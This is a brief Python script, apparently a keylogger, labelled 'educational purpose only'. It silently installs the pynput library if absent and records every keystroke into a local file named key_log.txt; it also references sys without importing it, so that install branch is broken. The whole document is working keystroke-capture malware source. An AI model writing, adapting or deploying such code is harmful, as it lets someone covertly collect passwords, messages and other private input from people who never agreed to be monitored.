# Script made by: N1ghtGu4rd
# Attention: Script made with educational purpose only

import subprocess

def install(package):
    subprocess.run([sys.executable, "-m", "pip", "install", package])

try:
    from pynput import keyboard
except ImportError:
    install("pynput")
    from pynput import keyboard

def on_press(key):
    with open("key_log.txt", "a", encoding="utf-8") as f:
        f.write(str(key))

def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
